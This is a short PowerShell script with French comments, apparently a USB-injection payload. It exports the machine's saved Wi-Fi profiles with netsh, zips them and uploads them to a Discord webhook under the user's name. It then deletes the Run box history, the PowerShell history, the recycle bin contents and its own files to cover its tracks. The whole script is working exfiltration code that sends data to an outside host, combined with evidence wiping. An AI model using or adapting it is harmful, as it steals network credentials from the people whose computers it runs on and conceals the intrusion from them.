# Créer le répertoire xml dans le répertoire personnel de l'utilisateur et exporter le profil wlan
$xmlPath = Join-Path $env:USERPROFILE "xml"
mkdir $xmlPath
netsh wlan export profile folder=$xmlPath

# Définir la fonction Upload-Discord
function Upload-Discord {

    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$folder,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text
    )

    $hookurl = "$dc"

    $Body = @{
      'username' = $env:username
      'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))){
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not ([string]::IsNullOrEmpty($folder))){
        $zipFile = Join-Path $env:TEMP "folder.zip"
        Compress-Archive -Path $folder -DestinationPath $zipFile -Force
        curl.exe -F "file=@$zipFile" $hookurl
        Remove-Item $zipFile -ErrorAction SilentlyContinue
    }
}

# Appeler la fonction Upload-Discord avec le chemin du dossier xml
Upload-Discord -folder $xmlPath

# Nettoie les traces 

function Clean-Exfil { 

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

# Delete xml folder 
Remove-Item $xmlpath -Recurse -Force -ErrorAction SilentlyContinue
}

# le truc de fin
$ce = 1
if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
